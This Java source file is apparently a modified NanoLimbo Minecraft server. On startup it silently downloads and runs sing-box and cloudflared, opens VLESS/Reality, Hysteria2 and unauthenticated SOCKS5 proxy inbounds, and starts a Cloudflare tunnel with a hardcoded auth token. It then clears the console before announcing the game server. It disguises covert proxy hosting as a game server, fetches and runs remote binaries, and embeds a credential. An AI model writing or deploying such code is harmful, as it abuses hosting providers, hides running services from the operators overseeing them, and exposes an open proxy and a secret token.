package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.Base64;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static final Pattern QUICK_TUNNEL_PATTERN = Pattern.compile("https://[a-z0-9-]+\\.trycloudflare\\.com");
    private static Process sbxProcess;
    private static Process cfProcess;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "REALITY_PRIVATE_KEY", "REALITY_SHORT_ID", "CF_VERSION"
    };


    public static void main(String[] args) {

        if (Float.parseFloat(System.getProperty("java.class.version")) < 52.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        try {
            startServices();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            clearConsole();
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            Thread.sleep(5000);
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
        }

        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }

    // ==================== Service Startup ====================

    private static void startServices() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        // Always detect real server IP for direct protocols (Reality/Hysteria2/TUIC/SOCKS5)
        String realIP = getPublicIP();
        envVars.put("SERVER_IP", realIP);
        System.out.println("[SBX] Detected server IP: " + realIP);

        String argoDomain = envVars.get("ARGO_DOMAIN");
        if (argoDomain == null || argoDomain.trim().isEmpty()) {
            envVars.put("ARGO_DOMAIN", realIP);
        }

        // Auto-generate Reality keys if not provided
        generateRealityKeysIfNeeded(envVars);

        // Generate sing-box config and subscription
        Path configPath = generateSingBoxConfig(envVars);
        generateSubscription(envVars);

        // Start sing-box
        System.out.println("[SBX] Starting sing-box...");
        ProcessBuilder pb = new ProcessBuilder(getSingBoxBinaryPath().toString(), "run", "-c", configPath.toAbsolutePath().toString());
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();

        // Start cloudflared if Argo is enabled
        String disableArgo = envVars.getOrDefault("DISABLE_ARGO", "false");
        if ("false".equalsIgnoreCase(disableArgo)) {
            startCloudflared(envVars);
        } else {
            System.out.println("[CF] Argo tunnel disabled by DISABLE_ARGO=true");
        }
    }

    // ==================== Reality Key Generation ====================

    private static void generateRealityKeysIfNeeded(Map<String, String> envVars) throws Exception {
        String privateKey = envVars.getOrDefault("REALITY_PRIVATE_KEY", "");
        String shortId = envVars.getOrDefault("REALITY_SHORT_ID", "");

        if (!privateKey.isEmpty() && !shortId.isEmpty()) {
            System.out.println("[SBX] Using provided Reality keys");
            return;
        }

        String realityPort = envVars.getOrDefault("REALITY_PORT", "");
        if (realityPort.isEmpty()) {
            System.out.println("[SBX] No REALITY_PORT set, skipping Reality key generation");
            return;
        }

        System.out.println("[SBX] Generating Reality keypair...");
        Path singBoxPath = getSingBoxBinaryPath();
        ProcessBuilder pb = new ProcessBuilder(singBoxPath.toString(), "generate", "reality-keypair");
        pb.redirectErrorStream(true);
        Process proc = pb.start();

        String privKey = null;
        String pubKey = null;
        BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println("[SBX] " + line);
            if (line.startsWith("PrivateKey")) {
                privKey = line.substring(line.indexOf(':') + 1).trim();
            } else if (line.startsWith("PublicKey")) {
                pubKey = line.substring(line.indexOf(':') + 1).trim();
            }
        }
        proc.waitFor();

        if (privKey == null || pubKey == null) {
            throw new IOException("Failed to generate Reality keypair");
        }

        if (privateKey.isEmpty()) {
            envVars.put("REALITY_PRIVATE_KEY", privKey);
        }
        if (shortId.isEmpty()) {
            shortId = UUID.randomUUID().toString().replace("-", "").substring(0, 8);
            envVars.put("REALITY_SHORT_ID", shortId);
        }
        envVars.put("REALITY_PUBLIC_KEY", pubKey);

        System.out.println("[SBX] Reality PublicKey: " + pubKey);
        System.out.println("[SBX] Reality ShortId: " + envVars.get("REALITY_SHORT_ID"));
        System.out.println("[SBX] (PrivateKey saved in config, not printed for security)");
    }

    // ==================== Cloudflared (Argo) ====================

    private static void startCloudflared(Map<String, String> envVars) throws Exception {
        Path cfPath = getCloudflaredBinaryPath(envVars);
        String argoAuth = envVars.getOrDefault("ARGO_AUTH", "");
        String argoPort = envVars.getOrDefault("ARGO_PORT", "8001");

        if (!argoAuth.isEmpty()) {
            // Fixed tunnel with token
            System.out.println("[CF] Starting Argo fixed tunnel...");
            ProcessBuilder pb = new ProcessBuilder(cfPath.toString(),
                "tunnel", "--no-autoupdate", "--edge-ip-version", "auto",
                "--protocol", "http2", "run", "--token", argoAuth);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
            cfProcess = pb.start();

            // Update subscription with fixed domain
            String argoDomain = envVars.getOrDefault("ARGO_DOMAIN", "");
            if (!argoDomain.isEmpty()) {
                generateSubscription(envVars);
                System.out.println("[CF] Argo fixed tunnel started, domain: " + argoDomain);
            }
        } else {
            // Quick tunnel (no token)
            System.out.println("[CF] Starting Argo quick tunnel...");
            ProcessBuilder pb = new ProcessBuilder(cfPath.toString(),
                "tunnel", "--no-autoupdate", "--edge-ip-version", "auto",
                "--protocol", "http2", "--url", "http://localhost:" + argoPort);
            pb.redirectErrorStream(true);
            cfProcess = pb.start();

            // Parse output to find the trycloudflare.com domain
            AtomicBoolean domainFound = new AtomicBoolean(false);
            Thread parserThread = new Thread(() -> {
                try {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(cfProcess.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null && !domainFound.get()) {
                        Matcher matcher = QUICK_TUNNEL_PATTERN.matcher(line);
                        if (matcher.find()) {
                            String domain = matcher.group();
                            String host = new URL(domain).getHost();
                            envVars.put("ARGO_DOMAIN", host);
                            domainFound.set(true);
                            System.out.println("[CF] Argo quick tunnel domain: " + host);
                            // Regenerate subscription with Argo domain
                            generateSubscription(envVars);
                            System.out.println("[CF] Subscription updated with Argo domain");
                        }
                    }
                } catch (Exception e) {
                    // Process may have been destroyed
                }
            });
            parserThread.setDaemon(true);
            parserThread.start();
        }
    }

    private static Path getCloudflaredBinaryPath(Map<String, String> envVars) throws IOException {
        String version = envVars.getOrDefault("CF_VERSION", "2025.10.0");
        String osArch = System.getProperty("os.arch").toLowerCase();
        String osName = System.getProperty("os.name").toLowerCase();

        String arch;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            arch = "amd64";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            arch = "arm64";
        } else {
            throw new RuntimeException("Unsupported architecture for cloudflared: " + osArch);
        }

        String platform = osName.contains("linux") ? "linux" :
                          osName.contains("mac") ? "darwin" : "linux";

        String filename = "cloudflared-" + platform + "-" + arch;
        String url = "https://github.com/cloudflare/cloudflared/releases/download/" + version + "/" + filename;

        Path binPath = Paths.get(System.getProperty("java.io.tmpdir"), "cf");

        if (!binPath.toFile().exists()) {
            System.out.println("[CF] Downloading cloudflared " + version + " (" + arch + ")...");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, binPath, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!binPath.toFile().setExecutable(true)) {
                throw new IOException("Failed to set cloudflared executable permission");
            }
            System.out.println("[CF] cloudflared downloaded successfully");
        }

        return binPath;
    }

    // ==================== IP Detection ====================

    private static String getPublicIP() {
        try {
            String[] services = {
                "https://api.ipify.org",
                "https://ifconfig.me",
                "https://icanhazip.com",
                "https://ipinfo.io/ip"
            };
            for (String service : services) {
                try {
                    URL url = new URL(service);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    String ip = reader.readLine().trim();
                    reader.close();
                    if (ip.matches("\\d+\\.\\d+\\.\\d+\\.\\d+")) {
                        return ip;
                    }
                } catch (Exception e) {
                    continue;
                }
            }
        } catch (Exception e) {
            System.err.println("[SBX] Failed to detect public IP: " + e.getMessage());
        }
        return "127.0.0.1";
    }

    // ==================== Subscription Generation ====================

    private static void generateSubscription(Map<String, String> env) throws IOException {
        String uuid = env.getOrDefault("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
        String argoDomain = env.getOrDefault("ARGO_DOMAIN", "");
        String serverIP = env.getOrDefault("SERVER_IP", "");
        String hy2Port = env.getOrDefault("HY2_PORT", "");
        String tuicPort = env.getOrDefault("TUIC_PORT", "");
        String realityPort = env.getOrDefault("REALITY_PORT", "");
        String s5Port = env.getOrDefault("S5_PORT", "");
        String cfIp = env.getOrDefault("CFIP", "spring.io");
        String name = env.getOrDefault("NAME", "sbx");
        String realityPublicKey = env.getOrDefault("REALITY_PUBLIC_KEY", "");
        String realityShortId = env.getOrDefault("REALITY_SHORT_ID", "");
        if (name.isEmpty()) name = "sbx";

        // Direct protocols use real server IP
        String directAddr = serverIP.isEmpty() ? cfIp : serverIP;
        StringBuilder sub = new StringBuilder();

        // VLESS WS via Argo (java-xah style)
        if (!argoDomain.isEmpty()) {
            String wsLink = String.format("vless://%s@%s:443?encryption=none&security=tls&sni=%s&fp=chrome&type=ws&path=%%2F%%3Fed%%3D2560#%s-ws-argo",
                uuid, argoDomain, argoDomain, name);
            sub.append(wsLink).append("\n");
        }

        // Hysteria2 links
        if (!hy2Port.isEmpty()) {
            for (String port : hy2Port.split(",")) {
                port = port.trim();
                if (!port.isEmpty()) {
                    String link = String.format("hysteria2://%s@%s:%s?insecure=1&obfs=salamander&obfs-password=%s#H2-%s",
                        uuid, directAddr, port, uuid.substring(0,8), name);
                    sub.append(link).append("\n");
                }
            }
        }

        // TUIC links
        if (!tuicPort.isEmpty()) {
            for (String port : tuicPort.split(",")) {
                port = port.trim();
                if (!port.isEmpty()) {
                    String link = String.format("tuic://%s:%s@%s:%s?congestion_control=bbr&alpn=h3&udp_relay_mode=native#TUIC-%s",
                        uuid, uuid, directAddr, port, name);
                    sub.append(link).append("\n");
                }
            }
        }

        // VLESS Reality links
        if (!realityPort.isEmpty() && !realityPublicKey.isEmpty()) {
            for (String port : realityPort.split(",")) {
                port = port.trim();
                if (!port.isEmpty()) {
                    String link = String.format("vless://%s@%s:%s?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.cloudflare.com&fp=chrome&pbk=%s&sid=%s&spx=%%2F&type=tcp&headerType=none#Reality-%s",
                        uuid, directAddr, port, realityPublicKey, realityShortId, name);
                    sub.append(link).append("\n");
                }
            }
        }

        // SOCKS5 links
        if (!s5Port.isEmpty()) {
            for (String port : s5Port.split(",")) {
                port = port.trim();
                if (!port.isEmpty()) {
                    String link = String.format("socks5://%s@%s:%s#S5-%s",
                        uuid, directAddr, port, name);
                    sub.append(link).append("\n");
                }
            }
        }

        if (sub.length() > 0) {
            System.out.println("\n========== Node Links ==========");
            System.out.print(sub.toString());
            System.out.println("================================");

            String base64 = Base64.getEncoder().encodeToString(sub.toString().getBytes("UTF-8"));
            System.out.println("\n========== Subscription (Base64) ==========");
            System.out.println(base64);
            System.out.println("============================================\n");

            Path subFile = Paths.get("sub.txt");
            Files.write(subFile, sub.toString().getBytes("UTF-8"));
            System.out.println("Subscription saved to: sub.txt");
        }
    }

    // ==================== Sing-Box Config Generation ====================

    private static Path generateSingBoxConfig(Map<String, String> env) throws Exception {
        String uuid = env.getOrDefault("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
        String hy2Port = env.getOrDefault("HY2_PORT", "");
        String tuicPort = env.getOrDefault("TUIC_PORT", "");
        String realityPort = env.getOrDefault("REALITY_PORT", "");
        String s5Port = env.getOrDefault("S5_PORT", "");
        String argoDomain = env.getOrDefault("ARGO_DOMAIN", "");
        String argoPort = env.getOrDefault("ARGO_PORT", "8001");
        String cfIp = env.getOrDefault("CFIP", "www.wto.org");
        String realityPrivateKey = env.getOrDefault("REALITY_PRIVATE_KEY", "");
        String realityShortId = env.getOrDefault("REALITY_SHORT_ID", "");

        String serverAddr = argoDomain.isEmpty() ? cfIp : argoDomain;

        // Generate self-signed cert for TLS protocols
        Path certDir = Paths.get(System.getProperty("java.io.tmpdir"), "certs");
        Files.createDirectories(certDir);
        Path certFile = certDir.resolve("cert.pem");
        Path keyFile = certDir.resolve("key.pem");

        if (!certFile.toFile().exists()) {
            System.out.println("[SBX] Generating self-signed certificate...");
            ProcessBuilder pb = new ProcessBuilder("openssl", "req", "-x509", "-newkey", "rsa:2048",
                "-keyout", keyFile.toAbsolutePath().toString(),
                "-out", certFile.toAbsolutePath().toString(),
                "-days", "3650", "-nodes",
                "-subj", "/CN=" + serverAddr);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
            try {
                pb.start().waitFor();
            } catch (InterruptedException e) {
                throw new IOException("Interrupted while generating certificate");
            }
        }

        String certPath = certFile.toAbsolutePath().toString().replace("\\", "/");
        String keyPath = keyFile.toAbsolutePath().toString().replace("\\", "/");

        StringBuilder inbounds = new StringBuilder();
        int tag = 0;

        // VLESS WS inbound for Argo tunnel (listen on localhost only)
        String disableArgo = env.getOrDefault("DISABLE_ARGO", "false");
        if (!"true".equalsIgnoreCase(disableArgo)) {
            inbounds.append(String.format(
                "{\"type\":\"vless\",\"tag\":\"argo_ws_%d\",\"listen\":\"127.0.0.1\",\"listen_port\":%s,\"users\":[{\"uuid\":\"%s\"}],\"transport\":{\"type\":\"ws\",\"path\":\"/\"}}",
                tag++, argoPort, uuid));
            inbounds.append(",");
        }

        // SOCKS5 (no TLS needed)
        if (!s5Port.isEmpty()) {
            for (String port : s5Port.split(",")) {
                port = port.trim();
                if (!port.isEmpty()) {
                    inbounds.append(String.format(
                        "{\"type\":\"socks\",\"tag\":\"s5_%d\",\"listen\":\"0.0.0.0\",\"listen_port\":%s}", tag++, port));
                    inbounds.append(",");
                }
            }
        }

        // Hysteria2 (needs TLS)
        if (!hy2Port.isEmpty()) {
            for (String port : hy2Port.split(",")) {
                port = port.trim();
                if (!port.isEmpty()) {
                    inbounds.append(String.format(
                        "{\"type\":\"hysteria2\",\"tag\":\"hy2_%d\",\"listen\":\"0.0.0.0\",\"listen_port\":%s,\"users\":[{\"password\":\"%s\"}],\"tls\":{\"enabled\":true,\"alpn\":[\"h3\"],\"certificate_path\":\"%s\",\"key_path\":\"%s\"}}",
                        tag++, port, uuid, certPath, keyPath));
                    inbounds.append(",");
                }
            }
        }

        // TUIC (needs TLS)
        if (!tuicPort.isEmpty()) {
            for (String port : tuicPort.split(",")) {
                port = port.trim();
                if (!port.isEmpty()) {
                    inbounds.append(String.format(
                        "{\"type\":\"tuic\",\"tag\":\"tuic_%d\",\"listen\":\"0.0.0.0\",\"listen_port\":%s,\"users\":[{\"uuid\":\"%s\",\"password\":\"%s\"}],\"congestion_control\":\"bbr\",\"tls\":{\"enabled\":true,\"alpn\":[\"h3\"],\"certificate_path\":\"%s\",\"key_path\":\"%s\"}}",
                        tag++, port, uuid, uuid, certPath, keyPath));
                    inbounds.append(",");
                }
            }
        }

        // VLESS Reality
        if (!realityPort.isEmpty() && !realityPrivateKey.isEmpty()) {
            for (String port : realityPort.split(",")) {
                port = port.trim();
                if (!port.isEmpty()) {
                    inbounds.append(String.format(
                        "{\"type\":\"vless\",\"tag\":\"reality_%d\",\"listen\":\"0.0.0.0\",\"listen_port\":%s,\"users\":[{\"uuid\":\"%s\",\"flow\":\"xtls-rprx-vision\"}],\"tls\":{\"enabled\":true,\"server_name\":\"www.cloudflare.com\",\"reality\":{\"enabled\":true,\"handshake\":{\"server\":\"www.cloudflare.com\",\"server_port\":443},\"private_key\":\"%s\",\"short_id\":[\"%s\"]}}}",
                        tag++, port, uuid, realityPrivateKey, realityShortId));
                    inbounds.append(",");
                }
            }
        }

        // Remove trailing comma
        if (inbounds.length() > 0 && inbounds.charAt(inbounds.length() - 1) == ',') {
            inbounds.setLength(inbounds.length() - 1);
        }

        String config = String.format(
            "{\"log\":{\"level\":\"info\"},\"inbounds\":[%s],\"outbounds\":[{\"type\":\"direct\",\"tag\":\"direct\"}]}",
            inbounds.toString()
        );

        Path configPath = Paths.get(System.getProperty("java.io.tmpdir"), "sing-box-config.json");
        Files.write(configPath, config.getBytes("UTF-8"));
        return configPath;
    }

    // ==================== Config Loading ====================

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "votexa.5566248.cc.cd");
        envVars.put("ARGO_AUTH", "eyJhIjoiN2ZiY2U5ZDc0OGM0MjU5OGZiZjkyYTM5ZjY5MDZkYmIiLCJ0IjoiZWM4Y2E2MjAtOTc2My00NjQzLWE2MWItMWJhYzU5MTNhNzhmIiwicyI6IllqazBOamhtWldJdFkyRmtaQzAwTjJGbUxXRXpNVEl0WW1WaU56VmlPVEkzT1RCbCJ9");
        envVars.put("S5_PORT", "");
        envVars.put("HY2_PORT", "25921");
        envVars.put("TUIC_PORT", "");
        envVars.put("ANYTLS_PORT", "");
        envVars.put("REALITY_PORT", "25921");
        envVars.put("ANYREALITY_PORT", "");
        envVars.put("REALITY_PRIVATE_KEY", "");
        envVars.put("REALITY_SHORT_ID", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "spring.io");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "");
        envVars.put("DISABLE_ARGO", "false");
        envVars.put("CF_VERSION", "2025.10.0");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }

        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;

                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }

                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");

                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }

    // ==================== Binary Management ====================

    private static Path getSingBoxBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String osName = System.getProperty("os.name").toLowerCase();
        String version = "1.13.14";
        String arch;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            arch = "amd64";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            arch = "arm64";
        } else if (osArch.contains("s390x")) {
            arch = "s390x";
        } else if (osArch.contains("arm")) {
            arch = "armv7";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        String platform = osName.contains("linux") ? "linux" :
                          osName.contains("mac") ? "darwin" : "linux";

        String filename = "sing-box-" + version + "-" + platform + "-" + arch + ".tar.gz";
        String url = "https://github.com/SagerNet/sing-box/releases/download/v" + version + "/" + filename;

        Path tarPath = Paths.get(System.getProperty("java.io.tmpdir"), "sbx.tar.gz");
        Path binPath = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");

        if (!binPath.toFile().exists()) {
            System.out.println("[SBX] Downloading sing-box " + version + " (" + arch + ")...");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, tarPath, StandardCopyOption.REPLACE_EXISTING);
            }

            Path extractDir = Paths.get(System.getProperty("java.io.tmpdir"), "sbx_extract_" + System.currentTimeMillis());
            Files.createDirectories(extractDir);

            ProcessBuilder pb = new ProcessBuilder("tar", "xzf", tarPath.toAbsolutePath().toString(),
                "-C", extractDir.toAbsolutePath().toString());
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
            int exitCode;
            try {
                exitCode = pb.start().waitFor();
            } catch (InterruptedException e) {
                throw new IOException("Interrupted while extracting sing-box");
            }

            if (exitCode != 0) {
                throw new IOException("Failed to extract sing-box binary");
            }

            Path found = findBinary(extractDir, "sing-box");
            if (found == null) {
                throw new IOException("sing-box binary not found in archive");
            }
            Files.move(found, binPath, StandardCopyOption.REPLACE_EXISTING);

            Files.deleteIfExists(tarPath);
            deleteDir(extractDir);
        }

        if (!binPath.toFile().setExecutable(true)) {
            throw new IOException("Failed to set executable permission");
        }
        return binPath;
    }

    private static Path findBinary(Path dir, String name) throws IOException {
        java.util.stream.Stream<Path> stream = Files.list(dir);
        try {
            for (Path p : (Iterable<Path>) stream::iterator) {
                if (p.getFileName().toString().equals(name)) {
                    return p;
                }
                if (Files.isDirectory(p)) {
                    Path found = findBinary(p, name);
                    if (found != null) return found;
                }
            }
        } finally {
            stream.close();
        }
        return null;
    }

    private static void deleteDir(Path dir) {
        try {
            Files.walk(dir).sorted(java.util.Comparator.reverseOrder())
                .forEach(p -> { try { Files.delete(p); } catch (Exception e) {} });
        } catch (Exception e) {}
    }

    // ==================== Shutdown ====================

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sing-box process terminated" + ANSI_RESET);
        }
        if (cfProcess != null && cfProcess.isAlive()) {
            cfProcess.destroy();
            System.out.println(ANSI_RED + "cloudflared process terminated" + ANSI_RESET);
        }
    }
}
